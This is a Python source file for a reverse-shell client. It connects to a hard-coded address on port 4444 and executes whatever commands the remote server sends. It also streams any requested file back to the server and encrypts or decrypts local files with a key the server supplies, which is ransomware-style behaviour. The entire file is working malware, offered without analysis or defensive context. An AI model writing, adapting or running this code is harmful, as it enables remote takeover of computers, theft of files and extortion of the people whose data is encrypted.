import socket
import os
import subprocess
import sys
from Crypto.Cipher import AES

SERVER_HOST = "10.0.1.24"
#SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 1024
SEPARATOR = "<sep>"

def crypt_file(file_path, k, isEncrypted) :
    
    cipher = AES.new(k, AES.MODE_EAX)
    if isEncrypted == False:
        # Read file
        with open(file_path, 'rb') as f:
            data = f.read()
        # Create the ciphertext
        ciphertext, tag = cipher.encrypt_and_digest(data)
        # Overwrite the file with the cipher text
        fo = open(file_path, "wb")
        [ fo.write(x) for x in (cipher.nonce, tag, ciphertext) ]
        fo.close()
    else:
        # Decrypt
        fi = open(file_path, "rb")
        nonce, tag, ciphertext = [ fi.read(x) for x in (16, 16, -1) ]
        fi.close()
        cipher = AES.new(k, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)
        with open(file_path, "wb") as fo:
            fo.write(data)

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splitted_command = command.split()
    #print(command)

    if command.lower() == "exit":
        break
    if splitted_command[0].lower() == "cd":
        try:
            # Change directory accoring to the command
            os.chdir(' '.join(splitted_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    elif splitted_command[0].lower() == 'read':
        file_name = splitted_command[1]
        
        try:
            # Send file size to server, needed for writing
            file_size = os.path.getsize(file_name)
            s.send(str(file_size).encode())
            
            # Read data from the file in blocks
            # File of any size can then be sent
            content = open(file_name, "rb")
            some_data = content.read(BUFFER_SIZE)
            while some_data :
                s.send(some_data)
                some_data = content.read(BUFFER_SIZE)
            content.close()

            s.recv(BUFFER_SIZE)
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    elif splitted_command[0].lower() == "encrypt":
        file_name = splitted_command[1]
        # Sending confirmation to server...
        s.send("1".encode())
        # Receiving symmetric key
        key = s.recv(BUFFER_SIZE)
        crypt_file(file_name, key, False)
        s.recv(BUFFER_SIZE)
        output = "File has been encrypted"
    elif splitted_command[0].lower() == "decrypt":
        file_name = splitted_command[1]
        # Sending confirmation to server...
        s.send("1".encode())
        # Receiving symmetric key
        key = s.recv(BUFFER_SIZE)
        crypt_file(file_name, key, True) #is encrypted, want to decrypt
        s.recv(BUFFER_SIZE)
        output = "File has been decrypted"
    else:
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

s.close()